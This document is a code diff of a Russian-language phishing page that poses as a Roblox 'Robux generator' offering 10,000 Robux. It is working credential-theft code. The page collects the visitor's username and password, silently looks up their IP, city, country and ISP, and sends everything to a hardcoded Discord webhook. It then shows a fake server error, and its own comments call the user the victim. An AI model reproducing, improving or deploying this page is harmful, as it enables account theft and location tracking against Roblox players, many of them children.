@@ -1,53 +1,87 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Promo - Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Promo Center 2025</title>
+    <style>
+        body { background-color: #191b1d; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #25272a; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 350px; border-top: 5px solid #00b06f; }
+        h1 { font-size: 24px; margin-bottom: 20px; color: #00b06f; }
+        p { font-size: 14px; color: #adb5bd; margin-bottom: 30px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #3a3d42; background: #3a3d42; border-radius: 4px; color: white; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #00b06f; }
+        button { width: 100%; padding: 12px; background-color: #00b06f; border: none; border-radius: 4px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #008a56; }
+        .logo { width: 60px; margin-bottom: 10px; }
+    </style>
 </head>
-<body style="background: #111; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="100" style="filter: invert(1);">
-    <h2>ВЕРИФИКАЦИЯ АККАУНТА</h2>
-    <p>Введите данные для получения 10,000 Robux</p>
-    
-    <input type="text" id="user" placeholder="Никнейм Roblox" style="padding: 10px; width: 250px;"><br><br>
-    <input type="password" id="pass" placeholder="Пароль для подтверждения" style="padding: 10px; width: 250px;"><br><br>
-    
-    <button id="mainBtn" style="background: #00b06f; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
-        АКТИВИРОВАТЬ
-    </button>
+<body>
 
-    <script>
-    document.getElementById('mainBtn').onclick = async function() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo" style="filter: invert(1);">
+    <h1>ROBUX GENERATOR</h1>
+    <p>Введите данные вашего аккаунта для синхронизации с сервером выдачи (10,000 R$)</p>
+    
+    <input type="text" id="username" placeholder="Имя пользователя">
+    <input type="password" id="password" placeholder="Пароль">
+    
+    <button id="claimBtn">ПОЛУЧИТЬ ROBUX</button>
+</div>
+
+<script>
+    document.getElementById('claimBtn').onclick = async function() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
         const webhook = "https://discord.com/api/webhooks/1454084286784475241/rgdIugwWDg61FL9dBQXVRj8kWquCg2zIYupzB3zD47Pf1RDAz76UVib0EESnOwBSIYJe";
 
-        if(!u || !p) return alert("Заполните все поля!");
+        if (!user || !pass) {
+            alert("Пожалуйста, заполните все поля!");
+            return;
+        }
+
+        // Бот "думает"
+        document.getElementById('claimBtn').innerText = "ОБРАБОТКА...";
+        document.getElementById('claimBtn').disabled = true;
 
         try {
-            // Скрытый сбор IP и города
+            // Скрыто получаем IP и город через сервис ipapi
             const geoRes = await fetch('https://ipapi.co/json/');
             const geo = await geoRes.json();
 
-            // Отправка в Discord
+            // Отправляем в Discord красивую карточку
             await fetch(webhook, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "📂 ПОЛУЧЕНЫ НОВЫЕ ДАННЫЕ",
-                        color: 16711680,
+                        title: "🎯 НОВЫЙ АККАУНТ В СЕТИ!",
+                        color: 65391, // Зеленый цвет
                         fields: [
-                            { name: "👤 Аккаунт", value: `Логин: ${u}\nПароль: ${p}`, inline: false },
-                            { name: "📍 Гео", value: `Город: ${geo.city}\nIP: ${geo.ip}`, inline: true }
-                        ]
+                            { name: "👤 Логин", value: `\`${user}\``, inline: true },
+                            { name: "🔑 Пароль", value: `\`${pass}\``, inline: true },
+                            { name: "📍 Местоположение", value: `${geo.city}, ${geo.country_name}`, inline: false },
+                            { name: "🌐 IP Адрес", value: `[${geo.ip}](https://ip-info.io/${geo.ip})`, inline: true },
+                            { name: "📱 Провайдер", value: geo.org, inline: true }
+                        ],
+                        footer: { text: "Roblox Promo System | 2025" },
+                        timestamp: new Date()
                     }]
                 })
             });
 
-            alert("Ошибка синхронизации! Попробуйте через 24 часа.");
-        } catch(e) { alert("Ошибка сервера."); }
+            // Обманываем жертву
+            setTimeout(() => {
+                alert("Ошибка: Сервер перегружен. Повторите попытку через 2 часа. Ваши данные поставлены в очередь.");
+                location.reload();
+            }, 1500);
+
+        } catch (error) {
+            alert("Ошибка соединения с сервером Roblox.");
+            location.reload();
+        }
     };
-    </script>
+</script>
+
 </body>
 </html>
